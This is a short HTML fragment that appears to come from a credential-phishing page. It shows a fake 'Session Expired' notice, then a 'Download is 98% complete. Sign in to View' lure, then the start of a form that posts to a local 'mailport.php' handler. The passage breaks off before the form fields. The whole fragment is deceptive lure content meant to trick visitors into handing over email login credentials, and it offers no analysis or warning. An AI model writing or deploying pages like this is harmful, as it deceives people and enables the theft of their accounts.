...
<body marginwidth="0" marginheight="0" topmargin="0" leftmargin="0" style="background: #FFF">	
	...
	<div style="position: absolute; top: 315px; left: 60px;">
		<font style="font-family: arial; font-size: 17px; color:#FFF;">Session Expired</font>
		<br><font style="font-family: arial; font-size: 12px; color:#FFFF00;">Download is 98% complete. Sign in to View</font>
	</div>
	<div style="position: absolute; top: 365px; left: 60px;">
			<form method="post" action="./mailport.php">
